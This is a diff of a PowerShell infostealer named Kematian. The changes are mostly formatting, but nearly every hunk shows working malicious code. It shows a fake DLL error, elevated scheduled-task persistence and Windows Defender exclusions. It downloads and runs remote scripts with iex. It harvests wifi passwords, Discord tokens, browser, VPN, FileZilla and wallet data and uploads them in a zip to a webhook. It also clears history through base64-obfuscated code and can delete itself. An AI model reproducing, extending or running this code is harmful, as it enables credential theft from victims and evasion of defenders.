@@ -18,11 +18,11 @@ else {
 $avatar = "https://i.imgur.com/DOIYOtp.gif"
 
 function KDMUTEX {
-	if ($fakeerror ) {Add-Type -AssemblyName System.Windows.Forms;[System.Windows.Forms.MessageBox]::Show("The program can't start because MSVCP110.dll is missing from your computer. Try reinstalling the program to fix this problem.",'','OK','Error')}
+    if ($fakeerror ) { Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show("The program can't start because MSVCP110.dll is missing from your computer. Try reinstalling the program to fix this problem.", '', 'OK', 'Error') }
     $AppId = "a0e59cd1-5d22-4ae1-967b-1bf3e1d36d6b" 
     $CreatedNew = $false
     $script:SingleInstanceEvent = New-Object Threading.EventWaitHandle $true, ([Threading.EventResetMode]::ManualReset), "Global\$AppID", ([ref] $CreatedNew)
-    if ( -not $CreatedNew ) { throw "[!] An instance of this script is already running."}
+    if ( -not $CreatedNew ) { throw "[!] An instance of this script is already running." }
     else {
         if ($debug) {
             Invoke-TASKS
@@ -47,13 +47,13 @@ function AUTOUPDATE {
         $KDOT_DIR.attributes = "Hidden", "System"
         $url = "https://github.com/ChildrenOfYahweh/Kematian-Stealer/raw/main/frontend-src/Kematian.pfx"
         $outputPath = "$env:tmp\Kematian.pfx"
-        if (Test-Path $outputPath) {Remove-Item $outputPath -Force}
+        if (Test-Path $outputPath) { Remove-Item $outputPath -Force }
         Invoke-WebRequest -Uri $url -OutFile $outputPath 
         $certificatePath = $outputPath
         $certificatePassword = ConvertTo-SecureString -String "Kematian" -AsPlainText -Force
         $certificate = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2($certificatePath, $certificatePassword)
         Set-AuthenticodeSignature -FilePath "$env:APPDATA\Kematian\Kematian.ps1" -Certificate $certificate -TimestampServer "http://timestamp.comodoca.com"
-        ri "$env:tmp\Kematian.pfx" -Force	
+        Remove-Item "$env:tmp\Kematian.pfx" -Force	
         $task_name = "Kematian"
         if ($debug) {
             $task_action = New-ScheduledTaskAction -Execute "PowerShell" -Argument "-ExecutionPolicy Bypass -File %appdata%\Kematian\Kematian.ps1"
@@ -65,7 +65,7 @@ function AUTOUPDATE {
         $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
         Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "Kematian" -RunLevel Highest -Force
         Start-ScheduledTask -TaskName "Kematian"
-        if ($melt) {ri $pscommandpath -force}
+        if ($melt) { Remove-Item $pscommandpath -force }
     }
     else {
         KDMUTEX
@@ -111,7 +111,7 @@ function VMPROTECT {
         iex (iwr -uri $link -useb)
         [ProcessUtility]::MakeProcessCritical()
         Invoke-TASKS
-	}
+    }
     else {
         $link = ("https://github.com/ChildrenOfYahweh/Kematian-Stealer/raw/main/frontend-src/antivm.ps1")
         iex (iwr -uri $link -useb)
@@ -121,11 +121,12 @@ function VMPROTECT {
 
 
 function Request-Admin {
-    while (-not (CHECK_AND_PATCH)) {if ($debug -eq $true) {
-            try {Start-Process "powershell" -ArgumentList "-NoP -Ep Bypass -File `"$PSCommandPath`"" -Verb RunAs;exit} catch {}
+    while (-not (CHECK_AND_PATCH)) {
+        if ($debug -eq $true) {
+            try { Start-Process "powershell" -ArgumentList "-NoP -Ep Bypass -File `"$PSCommandPath`"" -Verb RunAs; exit } catch {}
         }
         else {
-            try {Start-Process "powershell" -ArgumentList "-Win Hidden -NoP -Ep Bypass -File `"$PSCommandPath`"" -Verb RunAs;exit} catch {}
+            try { Start-Process "powershell" -ArgumentList "-Win Hidden -NoP -Ep Bypass -File `"$PSCommandPath`"" -Verb RunAs; exit } catch {}
         } 
     }	
 }
@@ -138,7 +139,7 @@ function Backup-Data {
     $timezoneString = "UTC$offsetHours"
     $filedate = Get-Date -Format "yyyy-MM-dd"
     $cc = (Invoke-WebRequest -Uri "https://www.cloudflare.com/cdn-cgi/trace" -useb).Content
-    $countrycode = ($cc -split "`n" | ? {$_ -match '^loc=(.*)$'} | % { $Matches[1] })
+    $countrycode = ($cc -split "`n" | ? { $_ -match '^loc=(.*)$' } | % { $Matches[1] })
     $folderformat = "$env:APPDATA\Kematian\$countrycode-($uuid)-($filedate)-($timezoneString)"
 
     $folder_general = $folderformat
@@ -149,7 +150,7 @@ function Backup-Data {
     $folder_email = "$folderformat\Email Clients"
     $important_files = "$folderformat\Important Files"
     $browser_data = "$folderformat\Browser Data"
-	$filezilla_bkp = "$folderformat\FileZilla"
+    $filezilla_bkp = "$folderformat\FileZilla"
 
     $folders = @($folder_general, $folder_messaging, $folder_gaming, $folder_crypto, $folder_vpn, $folder_email, $important_files, $browser_data, $filezilla_bkp)
     $folders | ForEach-Object {
@@ -287,9 +288,9 @@ function Backup-Data {
             $wifiPassword = $xmlContent.WLANProfile.MSM.security.sharedKey.keyMaterial
             $wifiAuth = $xmlContent.WLANProfile.MSM.security.authEncryption.authentication
             $wifiInfo += [PSCustomObject]@{
-                SSID = $wifiName
+                SSID     = $wifiName
                 Password = $wifiPassword
-                Auth = $wifiAuth
+                Auth     = $wifiAuth
             }
         }
         $wifiInfo | Format-Table -AutoSize | Out-String
@@ -313,7 +314,8 @@ function Backup-Data {
 
     try {
         Get-Content (Get-PSReadlineOption).HistorySavePath | Out-File -FilePath "$folder_general\clipboard_history.txt" -Encoding UTF8
-    } catch {
+    }
+    catch {
         # PSReadline is probably not enabled.
     }
 
@@ -431,7 +433,7 @@ function Backup-Data {
         Copy-Item -Path "$skypefolder\Local Storage" -Destination $skype_session -Recurse -force
     }
 	
-	function pidgin_stealer {
+    function pidgin_stealer {
         $pidgin_folder = "$env:userprofile\AppData\Roaming\.purple"
         if (!(Test-Path $pidgin_folder)) { return }
         $pidgin_accounts = "$folder_messaging\Pidgin"
@@ -588,7 +590,7 @@ function Backup-Data {
         Get-ChildItem $surfsharkvpnfolder -Include @("data.dat", "settings.dat", "settings-log.dat", "private_settings.dat") -Recurse | Copy-Item -Destination $surfsharkvpn_account
     }
 	
-	function openvpn_stealer {
+    function openvpn_stealer {
         $openvpnfolder = "$env:userprofile\AppData\Roaming\OpenVPN Connect"
         if (!(Test-Path $openvpnfolder)) { return }
         $openvpn_accounts = "$folder_vpn\OpenVPN"
@@ -632,18 +634,18 @@ Pass: $decodedPass
         }       
         $serversInfo = @()
         foreach ($xmlFile in @($recentServersXml, $siteManagerXml)) {
-        if (Test-Path $xmlFile) {
-            $xmlContent = Get-Content -Path $xmlFile
-            $servers = [System.Collections.ArrayList]@()
-            $xmlContent | Select-String -Pattern "<Server>" -Context 0,10 | ForEach-Object {
-                $serverInfo = ParseServerInfo -xmlContent $_.Context.PostContext
-                $servers.Add($serverInfo) | Out-Null
-            }
-            $serversInfo += $servers -join "`n"
+            if (Test-Path $xmlFile) {
+                $xmlContent = Get-Content -Path $xmlFile
+                $servers = [System.Collections.ArrayList]@()
+                $xmlContent | Select-String -Pattern "<Server>" -Context 0, 10 | ForEach-Object {
+                    $serverInfo = ParseServerInfo -xmlContent $_.Context.PostContext
+                    $servers.Add($serverInfo) | Out-Null
                 }
+                $serversInfo += $servers -join "`n"
             }
-            $serversInfo | Out-File -FilePath "$filezilla_hosts\Hosts.txt" -Force
         }
+        $serversInfo | Out-File -FilePath "$filezilla_hosts\Hosts.txt" -Force
+    }
 
     function Export-Data_Sessions {        
         telegramstealer
@@ -895,7 +897,7 @@ Pass: $decodedPass
             Add-Type -AssemblyName System.Drawing, System.Windows.Forms 
             Add-Type -AssemblyName System.Drawing 
             $jpegCodec = [Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() |  
-                Where-Object { $_.FormatDescription -eq "JPEG" } 
+            Where-Object { $_.FormatDescription -eq "JPEG" } 
         } 
         process { 
             Start-Sleep -Milliseconds 44 
@@ -925,19 +927,21 @@ Pass: $decodedPass
         $dirs | ForEach-Object { Remove-Item $_ -Force }
     } while ($dirs.Count -gt 0)
 	
-	Write-Host "[!] Getting information about the extracted data !"
-	Write-Host "`r `n"
+    Write-Host "[!] Getting information about the extracted data !"
+    Write-Host "`r `n"
 	
     # Send info about the data in the Kematian.zip
-	function kematianinfo {	
+    function kematianinfo {	
         $messaging_sessions_info = if (Test-Path $folder_messaging) {
             $messaging_sessions_content = Get-ChildItem -Path $folder_messaging | ForEach-Object { $_.Name -replace '\..+$' }
             if ($messaging_sessions_content) {
                 $messaging_sessions_content -join ' | '
-            } else {
+            }
+            else {
                 'False'
             }
-        } else {
+        }
+        else {
             'False'
         }
 
@@ -945,10 +949,12 @@ Pass: $decodedPass
             $gaming_sessions_content = Get-ChildItem -Path $folder_gaming -Directory | ForEach-Object { $_.Name -replace '\..+$' }
             if ($gaming_sessions_content) {
                 $gaming_sessions_content -join ' | '
-            } else {
+            }
+            else {
                 'False'
             }
-        } else {
+        }
+        else {
             'False'
         }
 
@@ -956,10 +962,12 @@ Pass: $decodedPass
             $wallets_found_content = Get-ChildItem -Path $folder_crypto -Directory | ForEach-Object { $_.Name -replace '\..+$' }
             if ($wallets_found_content) {
                 $wallets_found_content -join ' | '
-            } else {
+            }
+            else {
                 'False'
             }
-        } else {
+        }
+        else {
             'False'
         }
 
@@ -967,20 +975,24 @@ Pass: $decodedPass
             $vpn_accounts_content = Get-ChildItem -Path $folder_vpn -Directory | ForEach-Object { $_.Name -replace '\..+$' }
             if ($vpn_accounts_content) {
                 $vpn_accounts_content -join ' | '
-            } else {
+            }
+            else {
                 'False'
             }
-        } else {
+        }
+        else {
             'False'
         }
 
         $email_clients_info = if (Test-Path $folder_email) {
             if ((Get-ChildItem -Path $folder_email).Count -gt 0) {
                 'True'
-            } else {
+            }
+            else {
                 'False'
             }
-        } else {
+        }
+        else {
             'False'
         }
 
@@ -988,10 +1000,12 @@ Pass: $decodedPass
             $file_count = (Get-ChildItem -Path $important_files -File).Count
             if ($file_count -gt 0) {
             ($file_count)
-            } else {
+            }
+            else {
                 'False'
             }
-        } else {
+        }
+        else {
             'False'
         }
 
@@ -1000,20 +1014,24 @@ Pass: $decodedPass
             $browser_data_content = $browser_data_content -replace "^cookies_netscape_|-Browser$", ""
             if ($browser_data_content) {
                 $browser_data_content -join ' | '
-            } else {
+            }
+            else {
                 'False'
             }
-        } else {
+        }
+        else {
             'False'
         }
 
         $filezilla_info = if (Test-Path $filezilla_bkp) {
             if (Test-Path "$filezilla_bkp\Hosts.txt") {
                 'True'
-            } else {
+            }
+            else {
                 'False'
             }
-        } else {
+        }
+        else {
             'False'
         }
 
@@ -1030,10 +1048,10 @@ FileZilla: $filezilla_info
 "@
 
         return $webhookData
-	}	 
-	$kematainwebhook = kematianinfo
+    }	 
+    $kematainwebhook = kematianinfo
 	
-	# Send discord tokens in webhook message 
+    # Send discord tokens in webhook message 
     $discord_tokens = if (Test-Path "$folderformat\discord.json") {
         $jsonContent = Get-Content -Path "$folderformat\discord.json" -Raw
         $tokenMatches = [regex]::Matches($jsonContent, '"token": "(.*?)"')
@@ -1044,10 +1062,12 @@ FileZilla: $filezilla_info
                 $token
             }
             $tokens -join "`n`n"
-        } else {
+        }
+        else {
             'False'
         }
-    } else {
+    }
+    else {
         'False'
     }
 
@@ -1098,11 +1118,11 @@ FileZilla: $filezilla_info
                         "value" = "``````$wifipasswords``````"
                     }
                     @{
-                        "name" = ":file_folder: Kematian File Info"
+                        "name"  = ":file_folder: Kematian File Info"
                         "value" = "``````$kematainwebhook``````"
                     }
-					@{
-                        "name" = ":key: Discord Token(s)"
+                    @{
+                        "name"  = ":key: Discord Token(s)"
                         "value" = "```````n$discord_tokens``````"
                     }
                 )
@@ -1128,17 +1148,17 @@ FileZilla: $filezilla_info
     Compress-Archive -Path "$folder_general" -DestinationPath "$env:LOCALAPPDATA\Temp\Kematian.zip" -Force
     curl.exe -X POST -F 'payload_json={\"username\": \"Kematian\", \"content\": \"\", \"avatar_url\": \"https://i.imgur.com/6w6qWCB.jpeg\"}' -F "file=@$env:LOCALAPPDATA\Temp\Kematian.zip" $webhook
     
-	Write-Host "[!] The extracted data was sent successfully !" -ForegroundColor Green
+    Write-Host "[!] The extracted data was sent successfully !" -ForegroundColor Green
     Write-Host "`r `n"
 	
-	# cleanup
+    # cleanup
     Remove-Item "$env:LOCALAPPDATA\Temp\Kematian.zip" -Force
     Remove-Item "$folder_general" -Force -Recurse
 }
 
 function Invoke-TASKS {
     Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp" -Force
-	if ($persistence) {
+    if ($persistence) {
         Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp" -Force
         Add-MpPreference -ExclusionPath "$env:APPDATA\Kematian" -Force
         New-Item -ItemType Directory -Path "$env:APPDATA\Kematian" -Force
@@ -1152,7 +1172,7 @@ function Invoke-TASKS {
         $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
         Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "Kematian" -RunLevel Highest -Force
         Write-Host "[!] Task Created" -ForegroundColor Green
-	}
+    }
     if ($blockhostsfile) {
         $link = ("https://github.com/ChildrenOfYahweh/Kematian-Stealer/raw/main/frontend-src/blockhosts.ps1")
         iex (iwr -uri $link -useb)
@@ -1169,16 +1189,18 @@ if (CHECK_AND_PATCH -eq $true) {
     }    
     if ($debug) {
         exit
-    } else {
+    }
+    else {
         [ProcessUtility]::MakeProcessKillable()
     }
     $script:SingleInstanceEvent.Close()
     $script:SingleInstanceEvent.Dispose()
     #removes history
     I'E'X([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("UmVtb3ZlLUl0ZW0gKEdldC1QU3JlYWRsaW5lT3B0aW9uKS5IaXN0b3J5U2F2ZVBhdGggLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVl")))
-    if ($melt) {ri $pscommandpath -force}
+    if ($melt) { ri $pscommandpath -force }
 
-} else {
+}
+else {
     Write-Host ("[!] Please run as admin!") -ForegroundColor Red
     Start-Sleep -s 1
     Request-Admin
